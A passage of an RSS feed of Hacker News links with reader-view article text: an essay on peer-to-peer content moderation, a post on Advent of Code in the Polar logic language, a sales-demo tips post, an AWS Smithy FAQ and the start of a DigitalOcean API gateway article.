            <link>http://blog.fogus.me/2021/01/15/clojure-core/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25794739</guid>
            <pubDate>Fri, 15 Jan 2021 19:00:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Probablistic P2P Content Moderation]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25794562">thread link</a>) | @chasingsparks
<br/>
January 15, 2021 | https://generativist.falsifiable.com/metaverse/probablistic-p2p-content-moderation | <a href="https://web.archive.org/web/*/https://generativist.falsifiable.com/metaverse/probablistic-p2p-content-moderation">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><a href="https://generativist.falsifiable.com/">generativist</a> / <a href="https://generativist.falsifiable.com/metaverse/">metaverse</a>
    <hr>
    
    
    <p>Propagation is a Liberating Constraint In The Accoustic Space</p>
    <time datetime="2021-01-15 00:00:00 +0000 UTC">2021-01-15</time>
    <section>
        <figure><img src="https://p.falsifiable.page/zQmWmQdZiLAGFm912VRAweUQogjNeXA8GNTGBdn1nXXzewS" alt="A mesh network"></figure><hr>

<blockquote>
<p>Ours is a brand new world of allatonceness. “Time” has ceased. “Space” has vanished. We now live in a global village…a simultaneous happening. We are back in accoustic space. We have begun again to structure the primordial feeling, the tribal emotions from which a few centuries of literacy divorced us. We have had to shift our stress of attention from action to reaction. […] Electronic circuitry profoundly involves men with one another. Information pours upon us, instantaneously and continuously. Our electrically configured world has forced us to move from the habit of data classification to the mode of pattern recognition. We can no longer build serially, block-by-block, step-by-step, because instant communication insures that all the factors of the environment and of experience coexist in the state of active interplay.</p>

<p>– <a href="https://amzn.to/38M7C3Z">The Medium Is The Message</a>. McLuhan &amp; Fiore (1967, p. 63)</p>
</blockquote>

<hr>
<h2 id="start-with-a-goal-of-synthesis">Start With A Goal of Synthesis</h2>
<p>In my last post I argued that <em>what comes next</em> should be an <a href="https://generativist.falsifiable.com/metaverse/what-should-social-look-like">emphemeral-by-default, peer-to-peer, algorithmically-augmented</a> social medium. A while before that, I started focusing on a different question: <strong>how can we build a medium that can synthesize twitter’s capabilities, albeit peer-to-peer</strong>.<label for="sn-0"></label><span>The data used in <a href="https://generativist.falsifiable.com/metaverse/dunbars-number-is-quadratic">Dunbar’s Number Is Quadratic</a> was originally collected for that purpose. It was merely a convenient sample that I already had for that post.</span> I can’t answer this question in a single post. More than that, I don’t think I can answer it alone. But, I think it’s useful to start by thinking about messages and their propagation.</p>

<p>Carving away extraneous detail, tweets are the atoms of the twitter universe. They bind a blob of content to an identity at a particular time. Likes and retweets are time and identity bound pointers to tweets. They socially allocate attention without content creation. Quote tweets, replies, and quoted replies are compounds. They bind a blob of content <em>and</em> a pointer (or two) to an identity at a particular time. Ignoring time and identity, these foundational interactions look like,</p>
<figure><img src="https://p.falsifiable.page/zQmdC81odYejoG8GBKzaf44AxxbzBGiohrX8hiT6AUWuDcV" alt=""></figure><p>But, that is not the whole story. They joy of the medium is how users weave these interactions into a tapestry. Thus, if you want to synthesize twitter with P2P distribution, you can’t only consider atomic message exchange. You need to think about sub-graph collation and propagation, too. Measured in bytes, these may not be large objects. But, measured in milliseconds, latency can add up quickly – and <strong>latency matters a lot</strong>.</p>
<h2 id="sharing-subgraphs">Sharing Subgraphs</h2><p>Assume each foundational interaction (message) has a unique content hash.<label for="sn-1"></label><span>Assuming cryptographic hash functions and messages with timestamps and (optional?) nonces, this is an easy assumption to satisfy. Since the pointers are also covered by the hash function, there is also a block chain/graph structure for some messages. But I don’t think this should work via consensus (baring deliberate commits to a global ledger). My mental image is more like a soup of memes as unbound proteins.</span> The P2P network allows you to query for hashes and the associated content. The actual content includes a reference to the users identity as well as a cryptographic signature of the message.<label for="sn-2"></label><span>The signature signs the hash, so it’s not technically part of the message that gets digested. It’s just stored and shared as a sibling of the content.</span> Each node maintains a small subset of this data, conditional upon user and algorithmic requirements.</p>
<p>You have both the content <span>\(c_0\)</span> and its associated hash <span>\(f(c_0)\)</span>. The content-associated identity allows you to connect to the author or their delegated proxy. Where squares refer to the identity (identitical in this case), you have the following thread,<label for="sn-3"></label><span>I’m using threads because they are the easiest to reason about, not because they are the only sub-graph shape.</span></p>
<figure><img src="https://p.falsifiable.page/zQmUhvHLzEddXnMv5mpVV6P5RpvEdwpwDeJPm4gVa1QP6hL" alt=""></figure><p>If the protocol supports an action like <code>retrieve_subgraph(c)</code> and you are connected to <span>\(u_0\)</span>, this is an <span>\(O(1)\)</span> operation.</p>

<p>Now consider the following thread,</p>
<figure><img src="https://p.falsifiable.page/zQmZyTHaMBUrp67x2J2RXbU2LZ91Jk1pLrj5cq7LH3Loqeu" alt=""></figure><p>What happens when you call <code>retrieve_subgraph(c)</code> for <span>\(c_0\)</span> on <span>\(u_0\)</span>?</p>

<p>In the ideal case, <span>\(u_0\)</span> returns the entire thread in <span>\(\mathcal{O}(1)\)</span>. Because messages are signed and contain pointers the relevant parents, authenticity of the result is cryptographically assured. However, if <span>\(u_0\)</span> is is unaware of some inbound references or it has evicted them from its persistent stores and ephemeral buffers, the resulting view is incomplete in <span>\(\mathcal{O}(1)\)</span>.</p>

<p><strong><em>This incompleteness is not a bad thing.</em></strong> Two cases illustrate why,</p>

<ul>
<li><p><em>Abuse</em>: If <span>\(c_1\)</span> is abusive content replying to <span>\(c_0\)</span>,  <span>\(u_0\)</span> is under no obligation to propagate it. <span>\(u_0\)</span> created the context; they are in the best situation to moderate it.</p></li>

<li><p><em>Indirect Criticism</em>: If <span>\(c_0\)</span> is in some way bad and <span>\(u_1\)</span> wants to comment on it without provoking <span>\(u_0\)</span> or their followers,<label for="sn-4"></label><span>Screenshot tweets on twitter smell like a missing feature. But, I think there should be something like a detatched-head flag because I would probably let my agent filter out most of these interactions. I’d disable screenshot tweets if I could.</span> <span>\(u_1\)</span> is under no obligation to notify <span>\(u_0\)</span>.</p></li>
</ul>

<p>In the case of abuse, subscribers of <span>\(u_0\)</span> and not <span>\(u_1\)</span> benefit from the failure to propagate. Alternatively, subscribers of both are in the best position to evaluate and mediate (or ignore) the possible conflict. In the case of indirect criticism, the often self-perpetuating collision between identities and cliques is less likely to occur.</p>
<h2 id="incompleteness-is-structure">Incompleteness is Structure</h2><p><strong>This local incompleteness does not imply inaccessibility</strong>. For example,  consider the simple case where <span>\(u_0\)</span> flushed its ephemeral buffers and chose not to retain the rest of the chain.</p>

<ul>
<li><p>If the requester exhaustively queried each user on the graph, the cost of achieving completion would be a burdensome <span>\(\mathcal{O}(n)\)</span>.<label for="sn-6"></label><span>More likely, they would rely on a content accelerator intermediary. However, I assume those nodes augment the ecosystem at an additional cost to either the person making the query or the content producer, preserving incentives.</span> Unconditional queries are decidedly not social.</p></li>

<li><p>If the requestor queried users in proportion to prior interaction frequencies – and if nodes retained messages in proportion to time and interaction frequencies – the upper-bound is still <span>\(n\)</span>. However, <em>the expected time until completion is much, much lower, as a property of the interaction graph</em>. Interaction proportional queries are inherently social.<label for="sn-7"></label><span>This argument works for propagation by gossip, too.</span></p></li>
</ul>

<p>Now, assume there is a maximum cost threshold for queries. This may be explicitly programmed or implicitly generated as a function of latency, which users robustly do not tolerate.<label for="sn-8"></label><span>The argument still works for gossip distribution assuming user’s have finite resources and want to dedicate the minimum sufficient amount. This is a bit hand-wavy, but go on-board for <a href="https://scuttlebutt.nz/">SSB</a> and you’ll have a more visceral sense of how this is a useful constraint.</span> Assuming the heterogeneity of BYO algorithms and interfaces, this distribution does not lend itself to easy analysis. <em>That is a good thing!</em> The ragged landscape resists easy exploitation and manipulation. However, we can say something critical about the induced pressure – <strong>the probability of observing a message becomes a function of social peers willingness to propagate it.</strong></p>

<p>Whether by algorithm or explicit action, this structure allows users to engage in both amplification and <em>attenuation</em>.  These probabilistic boundaries can be rendered sharper given the addition of inhibiting signals – mutes and blocks operating at the level of either identity <em>or content</em>, functioning as something like antigens.<label for="sn-5"></label><span>I’m extremely biased here. After I finished my Ph.D. on belief systems and how they socially break down, I started working on a computational immune system for twitter via the API. Ignoring my conclusion – <a href="https://generativist.falsifiable.com/metaverse/where-did-the-future-go">that I was building a sand castle on someone’s private beach</a> – the API restricts made it extremely coarse. A lot of my motivation now is in making sure it’s possible on what comes next.</span> The willingness to accept or ignore one of these attestations of harm is at the discretion of the user. Boundary spanners may ignore them or implement time decay, facilitating social graph healing. Those more vulnerable may enforce them rigorously, warding off harms. But, in both cases, <a href="https://generativist.falsifiable.com/metaverse/centralized-social-partitions-considered-harmful">these boundaries are subject to continuous (re-)negotiation, rather than punctuated and durable ruptures</a>.</p>
<p>The result is socially-shaped content propagation.<label for="sn-9"></label><span>You can go even further and have nodes that propagate some messages to only some people. It’s a common social behavior. I think <a href="https://en.wikipedia.org/wiki/Google%2B#Circles">Circles</a> didn’t work because it was too rigid and effortful. But probablistic and conditional delivery is a huge opportunity.</span>  The decision not to propagate <em>is</em> a form of censorship. But, <strong>it exists at something like the maximum margin between freedom of speech and freedom of reach.</strong> Your time and attention are finite. The social graph structures it in useful ways. You need not abdicate your responsibilities and deliberation; but, you can collaborate for the purpose of socially-allocated attention.</p>
<h2 id="next-steps">Next Steps</h2><p>The great power of social media is discovery. Social discovery depends on,</p>

<ol>
<li>The willingness of inter-mediating paths to propagate a message;</li>
<li>The existence of ancillary curation services;</li>
<li><strong>The ability of peers to connect to each other or by proxy quickly</strong></li>
</ol>

<p>I’m confident that (1) is not only viable, but the fundamental solution. I also believe (2) is a useful out-of-core service, that helps with heterogeneity and ensures the platform can evolve. The big issue is (3). Last year, I started building a platform to fill exactly this gap, but I set it aside. Now, it’s time to pick it back up. <strong>If you have expertise in building cryptographic distributed systems, I do want to hear from you.</strong> In the meantime, I’m going continue doing ground work including building …</p></section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://generativist.falsifiable.com/metaverse/probablistic-p2p-content-moderation">https://generativist.falsifiable.com/metaverse/probablistic-p2p-content-moderation</a></em></p>]]>
            </description>
            <link>https://generativist.falsifiable.com/metaverse/probablistic-p2p-content-moderation</link>
            <guid isPermaLink="false">hacker-news-small-sites-25794562</guid>
            <pubDate>Fri, 15 Jan 2021 18:48:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Advent of Code in Polar (logic programming)]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25794536">thread link</a>) | @saolsen
<br/>
January 15, 2021 | https://www.osohq.com/post/advent-of-code-in-polar | <a href="https://web.archive.org/web/*/https://www.osohq.com/post/advent-of-code-in-polar">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
<h3>What is Polar</h3>
<p>The oso policy language, Polar, is designed to be good for writing authorization policies. Many of the choices made optimize for that use case. Things like its logic-based nature, pattern-matching specializers and how easy it is to interoperate with the host language's objects are all meant to make it easy to write policies over your existing data to make authorization decisions. But Polar isn't just for authorization, it's actually a fully general purpose language, a close relative of Prolog, and should be powerful enough for any computing task.</p>
<p>It's a good exercise to try and write programs in Polar that are more complicated than your average authorization rule set. Previously we even <a href="https://www.osohq.com/post/polar-adventure">implemented an entire game in Polar</a>. Using Polar in new and different ways teaches us a lot about the language and its rough edges.</p>
<h3>Why advent of code</h3>
<p><a href="https://adventofcode.com/">Advent of code</a> is a fun series of programming puzzles that are published every day from December 1st to December 25th. I've been a big fan of advent of code for a while and it has been a tool I've used to get better at programming. It's especially useful to me to try out a new language I'm learning. I did advent of code in Rust a few years ago when I was just getting started, and it really helped accelerate how fast I got the hang of things having to solve a bunch of different kinds of problems. I thought that this year I could do the same thing for Polar, and use advent of code to really see what it could do.</p>
<p>I have to admit I haven't finished all the problems yet but I've learned a ton about Polar, both good and bad in the process. I've clarified to myself a bunch of patterns that show up when writing Polar programs, found some rough edges in the language that we can clean up, and come up with some features that could help Polar in the future.</p>
<h2>Common Programming Patterns With Polar</h2>
<h3>Loops and Recursion</h3>
<p>Many times when solving a problem you need to iterate over a data structure. In the cases where this came up in advent of code it was usually a list. Polar has three ways to deal with lists: <code>in</code>, <code>forall</code>, and recursion.</p>
<p><code>in</code> is an operator that binds a variable to every member of a list. It can be used for membership checks, and can be combined with another expression to make a filter: <code>x in [1,2,3] and x &gt;= 2</code>.</p>
<p><code>forall</code> is an operator that succeeds if everything within it succeeds. <code>forall</code> is usually combined with <code>in</code> to check if a condition is true for every element in a list: <code>forall(x in [1,2,3], x &lt; 10)</code>.</p>
<p>If however you need to process a list element by element and combine the values in some way, you need to use list destructuring and recursion. We can do that with rules that match on a list with a rest variable. The <code>[first, *rest]</code> specializer matches a list and binds the first element to <code>first</code> and the rest of the list to <code>rest</code>.</p>
<p>Lets say you have a list of numbers and you want to sum them. There are two ways you can write this in Polar. This first way recursively goes down the list until it hits the base case (the empty list <code>[]</code>) and then builds back up the answer. </p>
<pre><code>sum([], 0);
sum([first, *rest], ans) if
    sum(rest, rest_ans) and
    ans = rest_ans + first;
</code></pre>

<p>The other way to write it is like this:</p>
<pre><code>sum([], ans, ans);
sum([first, *rest], prev_ans, ans) if
    this_ans = first + prev_ans and
    sum(rest, this_ans, ans);
sum(lst, ans) if sum(lst, 0, ans);
</code></pre>

<p>The differences here are subtle but important. In the first example you recurse down to the base case and then build up the result. In the second example you pass the intermediate result down to the next level and then bind the result var once you hit the base case.</p>
<p>The first one seems like it's a little simpler (it's less lines of code after all) but the second one should actually be preferred. It's an iterative recursive algorithm and can be thought of as a loop. The recursive call is the last thing in the rule which makes this a tail call and we can optimize this kind of recursion so that the stack doesn't grow. We are planning to implement this kind of optimization and have an <a href="https://github.com/osohq/oso/issues/641">issue</a> that you can vote on if it's import to your use cases.</p>
<p>Blowing the stack was something that happened a lot in my work on these problems. Tail call optimizations are something we need to add and when we do the second example will work even on very large arrays.</p>
<p>Another thing this pattern shows is how you can set up a recursive rule with two definitions: one that's the base case, and one that's the recursive case. Being able to lay these out with specializers I think makes it easy to see what's happening. When you have to add intermediate values to your recursive rules you can simply wrap the whole thing in a helper that sets up the default values and calls it directly for a list.</p>
<h3>Function Calls</h3>
<p>Polar rules don't work the same as functions in other languages. There is no return value; they simply specify relationships between variables and the rule succeeds or it doesn't. Sometimes (lots of times) you want to calculate something with a rule and get an answer out. In these cases you can use a function call pattern.</p>
<pre><code>add(a, b, answer) if answer = a + b;
</code></pre>

<p>You can simply pass another variable to a rule that will get bound to the result. This is something you get very comfortable with after writing Polar for a while, but can be confusing the first time you see logic programming.</p>
<h3>Helper functions</h3>
<p>Polar doesn't have a lot of builtin functions for operating on values. Lots of the power of Polar is that you can easily use host language objects and methods. For some problems if I needed something like a math function that wasn't defined in Polar I could easily set up a helper class with that method from Python and use it in Polar.</p>
<pre><code>class Lib:
    @staticmethod
    def cos(f):
        return Math.cos(f);

oso.register_constant(Lib, "Lib")
</code></pre>

<pre><code>cos(f, ans) if ans = Lib.cos(f);
</code></pre>

<h3>Inline Queries</h3>
<p>Polar has syntax for specifying an inline query, which is run when a Polar file is loaded and will throw an error if it doesn't succeed. I used these extensively for unit tests when doing advent of code problems.</p>
<pre><code>add(a, b, ans) if ans = a + b;

?=add(1,2,3);
?=not add(1,2,4);
</code></pre>

<h3>If / Else</h3>
<p>A Polar rule either succeeds, or it fails. If it fails, it backtracks and doesn't evaluate any more terms in the current branch. But sometimes you want to check if some condition is true, and do one thing if it is and another if it isn't. In most languages this would be an <code>if</code> / <code>else</code> branch. In polar you can do an equivalent thing with <code>or</code> and <code>cut</code>. The <code>or</code> sets up a choice point and the <code>cut</code> eliminates the untaken branch.</p>
<pre><code>(
    check_something() and
        then_block() and cut
) or (else_block());
</code></pre>

<h3>Case / Match statements</h3>
<p>Sometimes you have a value and you want to do different things depending on what the value is. In other languages this could be a switch statement, a match statement or even a big chain of <code>if</code> / <code>else if</code>/ <code>else</code> blocks. In Polar the best way to do these are with individual rules and specializers. This came up a lot in advent of code (as you'll see soon) and results in some really nice looking code.</p>
<h2>Places where Polar was a great fit</h2>
<p>Day 4 was one of my favorites to write in Polar. It's a great fit for the language. I had a list of inputs and a list of rules the inputs had to satisfy to be valid. This is very similar to a policy so I could write out the rules in Polar and evaluate them.</p>
<p><a href="https://gist.github.com/saolsen/114e4a8fca950cf143ff1924f13629a3">https://gist.github.com/saolsen/114e4a8fca950cf143ff1924f13629a3</a></p>
<p>Day 8 was my favorite of them all. I had to implement a little virtual machine. This included many of the patterns I spoke about above: using helpers from Python (in this case list indexing), the <code>if</code>/  <code>else</code> block pattern, and having rules for the individual operations:</p>
<pre><code>op("acc", arg, acc, i, next_acc, next_i) if next_i = i+1 and next_acc = acc+arg;
op("jmp", arg, acc, i, acc, next_i) if next_i = i+arg;
op("nop", _, acc, i, acc, next_i) if next_i = i+1;
</code></pre>

<p>The best part of day 8 was on part two where I had to take the program (the input) and find a version where a single instruction was swapped to a different one that made the program terminate. Without the swap the program will enter into an infinite loop. In Polar I can simply evaluate the program as usual but when I hit one of the swappable instructions, evaluate it swapped and not swapped. If I detect that that the program is looping, the query fails (and backtracks) and this way I can search the whole state of possible programs.</p>
<p><a href="https://gist.github.com/saolsen/df640e94933ead78da501da175249194">https://gist.github.com/saolsen/df640e94933ead78da501da175249194</a></p>
<h2>Places where Polar was a bad fit</h2>
<p>There were also some rough edges I hit.</p>
<h3>Counting successes</h3>
<p>A Polar rule either succeeds or fails. In a lot of cases I wanted to count the number of successes of a rule. For instance in a list of items, how many of them pass a rule? We have <code>forall</code> to see if all of them succeed, but no way to see how many succeed right now. You have to recurse over the list yourself and count as you go. There are some Prolog predicates that exist for this kind of thing ( <code>bagof</code> / <code>setof</code> / <code>findall</code> ) that we might consider adding to Polar.</p>
<h3>List operations</h3>
<p>There are many things you might want to do with lists that aren't built in. The only real built-in tool that you have is destructuring, which lets you pull items off the head and place items onto the head of lists. These operations are based on Lisp-style <code>cons</code> cells, where those are the only efficient operations. All other operations, like appending lists together, getting the nth element, or counting the length, etc have to be done with recursive rules, which adds to the complexity of the algorithm.  Polar represents lists internally as Rust vectors, not cons cells, so we could add builtins for other operations like getting the length, or appending to the end, or pulling out slices. There were many different days where any or all of these would have been useful, but I had to implement them as helpers in Python.</p>
<h3>Large searches</h3>
<p>Our defaults for stack size limit and timeouts for running a query are set small because …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.osohq.com/post/advent-of-code-in-polar">https://www.osohq.com/post/advent-of-code-in-polar</a></em></p>]]>
            </description>
            <link>https://www.osohq.com/post/advent-of-code-in-polar</link>
            <guid isPermaLink="false">hacker-news-small-sites-25794536</guid>
            <pubDate>Fri, 15 Jan 2021 18:46:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tips for an Interactive Sales Demo]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25794349">thread link</a>) | @sdneirf
<br/>
January 15, 2021 | https://remotehq.co/3oOgzzc | <a href="https://web.archive.org/web/*/https://remotehq.co/3oOgzzc">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-server-rendered="true" id="__nuxt"><!----><div id="__layout"><div><!---->  <main data-v-4ec71bb5=""><article data-v-4ec71bb5=""> <section data-v-4ec71bb5=""><div data-v-69a15e8e="" data-v-4ec71bb5=""><div data-v-69a15e8e="" data-v-4ec71bb5=""><p>In the 2021 work environment, sales demos continue to move &nbsp;online. There is little opportunity to have face to face demos or client meetings and teams have to adapt accordingly. Sales teams must learn how to create a personal experience for their potential clients virtually - having an interactive demo is vital. The virtual video call must parallel the warmth of an in person experience. Below are a few tips on how to have a more interactive sales demo. </p><p><strong>1. Use Shared Browser instead of screenshare.</strong></p><p>Screenshare is so 2020. <a href="https://remotehq.co/3i9xedO">Shared Browser</a> is a cloud-based browser that gives control to multiple participants. With RemoteHQ ‘s Shared Browser, you can co-browse any URL. This makes the experience more interactive as your clients can move around the page and easily explore any site/deck you’re sharing. However, this is only if/when you want guests to have control and edit access - you can change the permissions of Shared Browser at any time. You can easily have different teammates take control and lead the conversation rather than awkwardly turning screen share on and off between everyone. Shared Browser moves the meeting along faster than screen share, helping you perform better. Learn more about the <a href="https://remotehq.co/3oIVLsQ">power of Shared Browser</a> on our blog. </p><p><strong>2. Make time for questions throughout the demo</strong></p><p>It’s important to make sure your potential customers are able to ask questions and fully understand what you’re selling. With the reactions feature on RemoteHQ, all participants can easily raise their hands virtually. When someone’s hand is raised, there will be an ✋icon next to their video tile and once they start speaking, the icon will automatically go away. This way, there is no need to interrupt. Reactions make it clear when there is a question, so you can see who has questions and pause accordingly. </p><p><strong>3. Interactive notes</strong></p><p>Having accessible and visible notes during a meeting helps keep everyone focused and on task. Having an agenda on the screen helps guide the conversation and move it along at the right pace. It also lets everyone know what’s coming up in the conversation. The notes app on RemoteHQ is quick to pull up and also saves into your session history, which you can send to all guests after the meeting. Having a virtual whiteboard for group brainstorming is also a plus for an interactive demo. &nbsp;</p><p><strong>4. Insert video</strong></p><p>Video has been proven to retain a consumer’s attention better than text. It’s more engaging and entertaining for the viewer to consume. On RemoteHQ, you can open up the YouTube app integration and play a video on a call. Or simply go to YouTube, Vimeo, TikTok, etc on Shared Browser for a seamless transition. </p><p><strong>5. Focus on the demo</strong></p><p>Let RemoteHQ do the heavy lifting. Turn on audio transcription and let RemoteHQ take notes for you. &nbsp;This allows you to focus on what is most important: Pitching to your prospect. At the end of your session everything that was said by all participants will be available to you. Easily copy and paste them into your CRM for a record of what happened. Throughout the demo, you can also sync your layout with everyone in the meeting whenever you move from different pages and apps - this important to keep clients on track and paying attention to what you want them to do. </p><p><a href="https://remotehq.co/2LNIUXz">Try it out</a> and see if these tips can help you on your next sales call! Learn about other features you didn’t know you needed in remote work on our <a href="https://remotehq.co/2XDLzWs">blog</a>. </p><p>Casey+RemoteHQ team</p></div></div></section></article> <section data-v-a406a7da="" data-v-4ec71bb5=""><div data-v-a406a7da=""><h2 data-aos="fade-up" data-v-a406a7da="">You might also like</h2> <!----> <div data-aos="fade-up" data-aos-delay="300" data-v-a406a7da=""><div data-v-a406a7da="" data-v-4ec71bb5=""><article data-v-5a12a432="" data-v-4ec71bb5=""><figure data-v-5a12a432=""><img src="https://blog.remotehq.com/content/images/size/w600/2020/12/The-Power-of-Shared-Browser.jpg" srcset="https://blog.remotehq.com/content/images/size/w300/2020/12/The-Power-of-Shared-Browser.jpg 300w, https://blog.remotehq.com/content/images/size/w600/2020/12/The-Power-of-Shared-Browser.jpg 600w, https://blog.remotehq.com/content/images/size/w1000/2020/12/The-Power-of-Shared-Browser.jpg 1000w, https://blog.remotehq.com/content/images/size/w2000/2020/12/The-Power-of-Shared-Browser.jpg 2000w" sizes="(max-width: 1000px) 400px, 700px" alt="The Power of Shared Browser" data-v-5a12a432=""></figure> <section data-v-5a12a432=""> <p data-v-5a12a432="">
      Shared Browser is a cloud-based browser that gives control to multiple participants. The tool allows our users to co-browse and co-control any web page. Of all the RemoteHQ features, Shared Browser is the most used and most impressive. 
    </p> </section></article><article data-v-5a12a432="" data-v-4ec71bb5=""><figure data-v-5a12a432=""><img src="https://blog.remotehq.com/content/images/size/w600/2020/08/FutureOfWork.png" srcset="https://blog.remotehq.com/content/images/size/w300/2020/08/FutureOfWork.png 300w, https://blog.remotehq.com/content/images/size/w600/2020/08/FutureOfWork.png 600w, https://blog.remotehq.com/content/images/size/w1000/2020/08/FutureOfWork.png 1000w, https://blog.remotehq.com/content/images/size/w2000/2020/08/FutureOfWork.png 2000w" sizes="(max-width: 1000px) 400px, 700px" alt="Mastering Remote Leadership" data-v-5a12a432=""></figure> <section data-v-5a12a432=""> <p data-v-5a12a432="">
      Ryan Burke , former SVP at InVision
, joined us on the Future of Work show to discuss
remote leadership tactics. Ryan joined InVision in 2014 as the Head of Sales &amp;
Success when there were only 35 employees. Six years later he left as the SVP of
International Sales for a company that grew to over 800 employees distributed
across 20 countries worldwide. Now, he’s sharing his learnings with us.

👀Watch Here
To dive right in, c
    </p> </section></article><article data-v-5a12a432="" data-v-4ec71bb5=""><figure data-v-5a12a432=""><img src="https://blog.remotehq.com/content/images/size/w600/2020/08/Screen-Shot-2020-08-07-at-11.25.14-AM-1.png" srcset="https://blog.remotehq.com/content/images/size/w300/2020/08/Screen-Shot-2020-08-07-at-11.25.14-AM-1.png 300w, https://blog.remotehq.com/content/images/size/w600/2020/08/Screen-Shot-2020-08-07-at-11.25.14-AM-1.png 600w, https://blog.remotehq.com/content/images/size/w1000/2020/08/Screen-Shot-2020-08-07-at-11.25.14-AM-1.png 1000w, https://blog.remotehq.com/content/images/size/w2000/2020/08/Screen-Shot-2020-08-07-at-11.25.14-AM-1.png 2000w" sizes="(max-width: 1000px) 400px, 700px" alt="Opening The Talent Pool" data-v-5a12a432=""></figure> <section data-v-5a12a432=""> <p data-v-5a12a432="">
      RemoteHQ welcomed Clay Kellogg to the
Future of Work show to discuss opening the talent pool. Clay is the CEO of 
Terminal , a platform helping build elite remote
engineering teams. Clay recognizes that talent is distributed equally, but
highlights that opportunity is not. Terminal helps growing companies access
global talent by making it easy to recruit and scale remote teams.

🎧Watch Here
To dive right in, click below to watch t
    </p> </section></article></div></div></div></section></main> </div></div></div></div>]]>
            </description>
            <link>https://remotehq.co/3oOgzzc</link>
            <guid isPermaLink="false">hacker-news-small-sites-25794349</guid>
            <pubDate>Fri, 15 Jan 2021 18:34:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AWS Smithy: A language for defining services and SDKs]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25794213">thread link</a>) | @based2
<br/>
January 15, 2021 | https://awslabs.github.io/smithy/ | <a href="https://web.archive.org/web/*/https://awslabs.github.io/smithy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div>
            <h2>FAQs</h2>

            <h2>Why did you develop Smithy?</h2>
            <p>Smithy is based on an interface definition language that has been widely
                used within Amazon and AWS for over a decade. We decided to release Smithy
                publicly to let other developers use Smithy for their own services and
                benefit from our years of experience with building tens of thousands of
                services. By releasing the Smithy specification and tooling, we also hope
                to make it easier for developers to maintain open source AWS SDKs.</p>

            <h2>Does Smithy only work with AWS?</h2>
            <p>No. Smithy can be used with any kind of service. All AWS-specific metadata
                in Smithy is implemented as decoupled packages.</p>

            <h2>Why not just use an existing IDL?</h2>
            <p>At AWS, we rely heavily on metadata, code generation, service frameworks,
                client libraries, and automated policy enforcement. Existing IDLs
                available outside of AWS were not extensible enough to meet our needs
                and not compatible with our existing services.</p>

            <h2>How is Smithy different than other IDLs and frameworks?</h2>
            <p><strong>Smithy is built for code generation and tools.</strong>
                Smithy models were designed for the purpose of generating code for
                multiple programming languages. For example, Smithy models are
                completely normalized, which gives all generated types an explicit
                name and makes models easy to traverse, validate, and diff.</p>
            <p><strong>Smithy can be extended <em>and</em> constrained.</strong>
                Traits are used to extend a model and add capabilities that are not
                part of the core specification. For example, AWS defines AWS-specific
                traits that are used to generate other metadata documents that are
                derived from Smithy models. While extensibility is a key design
                requirement, Smithy provides a built-in validation system that
                ensures models adhere to a configurable set of rules and policies.</p>
            <p><strong>Smithy is protocol agnostic.</strong> Smithy decouples the
                transport layer of web services from the data structures and capabilities
                of the service so that they can evolve independently.</p>
            <p><strong>Smithy helps large organizations collaborate on APIs.</strong>
                Smithy allows different aspects of a model to be owned by different
                teams. We use this feature at AWS to allow the documentation teams
                to own API documentation, while service owners control the shape and
                operations of a service.</p>
            <p><strong>Smithy models can be altered for different audiences</strong>.
                Smithy's <em>projection</em> system allows the contents of a model to
                be filtered and changed based on who a particular build of a model is
                intended for. This allows for use cases like maintaining an internal
                and external version of a model and providing beta models to customers
                as part of a private beta.</p>

            <h2>What does protocol-agnostic mean?</h2>
            <p>Protocol-agnostic means that the model is an abstraction that specifies
                the rules and semantics of how a client and server communicate. The
                transport and serialization format of a service is left as an
                implementation detail, allowing them to evolve over time. For example,
                a service owner may wish to evolve their serialization format (e.g.,
                move from text to binary), their connection type (e.g., move from
                HTTP/1 to HTTP/2), or launch entirely new capabilities.</p>

            <h2>What is the main difference between Smithy and OpenAPI?</h2>
            <p>The primary difference between Smithy and OpenAPI is that Smithy is
                protocol-agnostic, allowing Smithy to describe a broader range of
                services, metadata, and capabilities. Smithy can be used alongside
                OpenAPI by <a href="https://awslabs.github.io/smithy/guides/converting-to-openapi.html">converting Smithy models to OpenAPI</a>.</p>

            <section>
                <a href="https://awslabs.github.io/smithy/quickstart.html">Quick start -&gt;</a>
            </section>
        </div>
    </div></div>]]>
            </description>
            <link>https://awslabs.github.io/smithy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25794213</guid>
            <pubDate>Fri, 15 Jan 2021 18:26:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building DigitalOcean’s API Gateway]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25793830">thread link</a>) | @louis-paul
<br/>
January 15, 2021 | https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html | <a href="https://web.archive.org/web/*/https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">
	<p>TL;DR: this is mostly a text version of a presentation I’ve done a couple times (<a href="https://www.youtube.com/watch?v=S8OQfB6JSf8">English</a> or <a href="https://www.youtube.com/watch?v=Ld8UFU-DB1U">Portuguese</a>) on the history of building DigitalOcean’s API gateway. How we made it easier for folks to build new microservices instead of continuing to add code to our monoliths, the successes, failures and lessons learned.</p>

<p>First, where were we?</p>

